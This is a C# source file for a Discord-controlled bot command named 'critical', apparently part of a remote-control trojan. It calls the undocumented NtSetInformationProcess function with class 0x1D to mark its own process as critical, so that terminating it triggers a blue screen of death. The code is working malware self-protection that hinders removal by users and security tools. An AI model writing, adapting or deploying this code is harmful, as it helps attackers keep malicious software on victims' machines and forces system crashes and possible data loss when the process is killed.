using Discord;
using Discord.Commands;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Main.Source.Bot.Commands
{
    public class Critical : CommandBase
    {
        [DllImport("ntdll.dll")]
        private static extern int NtSetInformationProcess(
            IntPtr Process,
            int ProcessInformationClass,
            ref int ProcessInformation,
            int ProcessInformationLength
        );

        public override string Name => "critical";
        public override string Info => "Makes the process trigger the blue screen of death when terminated";
        public override string Use => "-on | -off";

        public override async Task Func(SocketCommandContext socket, string[] args)
        {
            if (!Utilities.Common.IsElevated())
            {
                await socket.Message.ReplyAsync("Cannot run command while not elevated");
                return;
            }

            if (args.Length != 1)
            {
                await socket.Message.ReplyAsync("Usage: " + Use);
                return;
            }

            string arguments = string.Join(" ", args);

            if (Utilities.Parser.GetFlag(arguments, "on"))
            {
                int critical = 1;

                Process.EnterDebugMode();

                NtSetInformationProcess(
                    Process.GetCurrentProcess().Handle,
                    0x1D,
                    ref critical,
                    sizeof(int)
                );
            }
            else if (Utilities.Parser.GetFlag(arguments, "off"))
            {
                int critical = 0;

                Process.EnterDebugMode();

                NtSetInformationProcess(
                    Process.GetCurrentProcess().Handle,
                    0x1D,
                    ref critical,
                    sizeof(int)
                );
            }
            else
            {
                await socket.Message.ReplyAsync("Usage: " + Use);
            }
        }
    }
}
